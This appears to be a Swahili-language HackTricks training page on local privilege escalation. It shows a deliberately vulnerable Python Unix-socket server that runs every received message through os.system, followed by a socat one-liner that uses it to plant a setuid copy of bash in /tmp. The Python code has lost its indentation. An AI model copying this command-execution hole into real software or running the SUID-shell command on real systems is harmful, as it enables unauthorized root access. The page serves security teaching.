{{#include ../../banners/hacktricks-training.md}}

## Mfano wa kuunganisha socket kwa Python

Katika mfano ufuatao, **socket ya unix inaundwa** (`/tmp/socket_test.s`) na kila kitu **kilichopokelewa** kitakuwa **kinatekelezwa** na `os.system`. Najua huenda usikute hii katika mazingira halisi, lakini lengo la mfano huu ni kuona jinsi msimbo unaotumia socket za unix unavyoonekana, na jinsi ya kudhibiti ingizo katika hali mbaya zaidi.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Teza** msimbo ukitumia python: `python s.py` na **angalia jinsi socket inavyosikiliza**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Kuvunja**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
